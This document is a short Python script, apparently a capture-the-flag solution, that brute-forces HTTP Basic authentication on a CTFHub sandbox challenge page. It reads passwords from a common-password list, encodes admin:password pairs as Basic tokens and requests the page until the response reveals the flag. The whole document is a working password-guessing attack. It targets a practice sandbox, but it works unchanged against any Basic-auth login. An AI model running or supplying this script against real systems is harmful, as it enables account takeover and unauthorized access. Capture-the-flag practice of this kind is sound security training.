import requests
import base64

target_url = "http://challenge-01a476180f764fe6.sandbox.ctfhub.com:10800/flag.html"
username = "admin"
password_file = "10_million_password_list_top_100.txt"

with open(password_file, "r") as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    credentials = f"{username}:{password}"
    token = base64.b64encode(credentials.encode()).decode()
    headers = {"Authorization": f"Basic {token}"}
    try:
        response = requests.get(target_url, headers=headers, timeout=5)
        if "ctfhub" in response.text:
            print(f"[+] Found password: {password}")
            print(f"[+] Response: {response.text}")
            break
        else:
            print(f"[-] Trying: {password} - Failed")
    except Exception as e:
        print(f"[!] Error with password {password}: {e}")